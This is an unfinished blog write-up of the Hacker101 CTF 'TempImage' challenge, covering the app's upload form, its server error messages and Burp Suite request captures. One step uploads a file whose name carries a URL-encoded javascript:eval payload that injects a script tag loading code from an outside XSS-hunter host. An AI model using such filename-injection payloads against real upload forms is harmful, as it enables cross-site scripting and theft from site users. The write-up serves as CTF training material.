---
title: Hacker101 CTF TempImage [moderate] Write-Up
subtitle: a work in progress
description: A write up for the TempImage [moderate] challenge
published: true
datePublished: 1611357758022
author: lwlx
authorTwitter: "0x0000005"
authorPhoto: /profile
tags:
  - ctf
  - writeup
  - hackerone
  - TempImage
  - security
thumbnailPhoto: /hackerone/tempimage/tempimage-hackerone.webp
bannerPhoto: /hackerone/tempimage/tempimage-hackerone
canonicalUrl:
---

### `WIP`

This is my Write Up for the "TempImage" challenge of HackerOne's CTF.

As usual we get a link to webpage, it seems to some sort of cloud storage application, on the main Page we get a really simple page:

```jsx
<!-- https://ctf.hacker101.com/ctf/launch/12 -->

<html>
  <head>
    <title>TempImage &mdash; Trial</title>
  </head>
  <body>
    <h1>TempImage</h1>
    <p>
      <b>UNREGISTERED</b>
    </p>
    <p>
      <a href="upload.php">Upload image</a>
    </p>
  </body>
</html>
```

It signifies that its an UNEGISTERED version of the app, thus working in trial mode.

## Enumeration

So lets start to explore the app and what it can do. We start by clicking the "Upload image" Button.
This leads us to a new page **/upload.php**, here we can select a file from our computer, and have a submit button to send the form.

The form will be sent to a **doUpload.php** file. Upon closer inspection we alos see that there is a hidden field "filename", which gets filled in by aJS snippet.

```jsx
   <h1>Upload</h1>
		<form action="doUpload.php" method="POST" enctype="multipart/form-data">
			<input type="file" name="file" id="file">
			<input type="hidden" name="filename" id="filename">
			<input type="submit" value="Upload">
		</form>
		<script>
			$(document).ready(function() {
				$('#file').change(function(e) {
					$('#filename').val(e.target.files[0].name)
				})
			})
	 </script>
```

So it seems this lil script extracts the `file.name` prop from the fileOpbject the user uploads to the input type="file".

Lets Try it out, It seems the file inpput allows any file to be chosen, lets try a 5mb .gif file.

```jsx
<center><h1>413 Request Entity Too Large</h1></center>
<hr><center>nginx/1.14.0 (Ubuntu)</center>
```

OK, fair, maybe 5mb was a it large, but we know we're working with an nginx 1.14 server on Ubuntu.
So how about we try a smaller gif?

```shell
ERROR: Only PNG format supported in trial.
```

Okay, finally we know what the app expects from us, a PNG file. So we try jsut that.
The upload succeeds, thus redirecting us to a new url:
`/files/be9c26aaea9d9b5085c7f6eed0812745_uhhhh.png`

so it seems our files are uploaded to the `/files/` directory, what a suprise, the file stil contains our original filename, preceeded by some gibberish.

we should deffinetly try to exploit this, check wheter or not they sanitize our filename.

Lets try uploading a file named: `javascript%3Aeval%28%27var%20a%3Ddocument.createElement%28%5C%27script%5C%27%29%3Ba.src%3D%5C%27https%3A%2F%2FDiscover.xss.ht%5C%27%3Bdocument.body.appendChild%28a%29%27%29.png`

We now get redirected to this url `http://35.190.155.168/d29c8e00db/files/9975e7e24fac21e8b877a6d08efe09c6_javascript%3Aeval%28%27var%20a%3Ddocument.createElement%28%5C%27script%5C%27%29%3Ba.src%3D%5C%27https%3A%2F%2FDiscover.xss.ht%5C%27%3Bdocument.body.appendChild%28a%29%27%29.png`

and we get served this content:

```javascript
Not Found
The requested URL /files/9975e7e24fac21e8b877a6d08efe09c6_javascript:eval('var a=document.createElement(\'script\');a.src=\'https:/Discover.xss.ht\';document.body.appendChild(a)').png was not found on this server.

Apache/2.4.7 (Ubuntu) Server at 127.0.0.1 Port 52736
```

so it seems there is potential there, we just need a more sophisticated payload to upload.

## Taking a step back

It's important not to get tunnelvision and only focus on your first finding, so lets take a step back and analyze the website using Burp Suite. Maybe we'll find something.
Lets analyze the upload URL first:

```shell
GET /d29c8e00db/upload.php HTTP/1.1
Host: 35.190.155.168
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close
```

This does not tell us that much, it seems the server could accep more than just PNG tho.

How about if we upload an image?

`POST /d29c8e00db/doUpload.php HTTP/1.1`

![image upload Request](/hackerone/tempimage/tempimage-hackerone101-burpSuite_fileupload.png "image upload Request")

> This Post is marked as `WIP` and will be updated continously.
